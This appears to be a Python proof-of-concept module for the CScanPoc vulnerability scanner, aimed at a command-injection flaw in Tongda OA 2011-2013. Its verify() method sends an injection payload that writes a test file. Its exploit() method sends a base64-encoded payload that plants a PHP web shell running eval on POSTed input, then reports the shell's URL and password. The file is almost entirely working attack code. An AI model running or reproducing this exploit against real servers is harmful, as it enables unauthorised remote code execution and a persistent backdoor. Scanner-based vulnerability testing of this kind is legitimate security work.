# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'TongdaOA_0013'  # 平台漏洞编号，留空
    name = '通达OA 2011-2013 通杀GETSHELL'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-02-01'  # 漏洞公布时间
    desc = '''
        通达OA系统代表了协同OA的先进理念,16年研发铸就成熟OA产品。
        通达OAT9智能管理平台是基于B/S架构，灵活、稳定、安全、高性能的办公系统。采用自主研发的引擎技术，提供强大的工作流和公文流程管理功能，可完全根据客户需求定制办公门户平台。
        /general/crm/studio/modules/EntityRelease/release.php 由于参数过滤不严谨，造成注入命令执行。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/357/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '通达OA系统'  # 漏洞应用名称
    product_version = '通达OA 2011-2013'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ea03e8cd-b058-4bcf-882a-3014280edf77'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload1 = "/general/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgZWNobyBtZDUoYyk7ID8+b2s=))}"
            payload2 = '/site/general/email/index.php'
            payload3 = '/general/email/shell.php'
            url1 = self.target + payload1
            url2 = self.target + payload2
            url3 = self.target + payload3

            requests.get(url1)
            requests.get(url2)
            r = requests.get(url3)
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url1))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload1 = "/general/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgZWNobyBtZDUoYyk7QGV2YWwoJF9QT1NUW2NdKTs/Pm9r))}"
            payload2 = '/site/general/email/index.php'
            payload3 = '/general/email/shell.php'
            url1 = self.target + payload1
            url2 = self.target + payload2
            url3 = self.target + payload3

            requests.get(url1)
            requests.get(url2)
            r = requests.get(url3)
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=url3))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
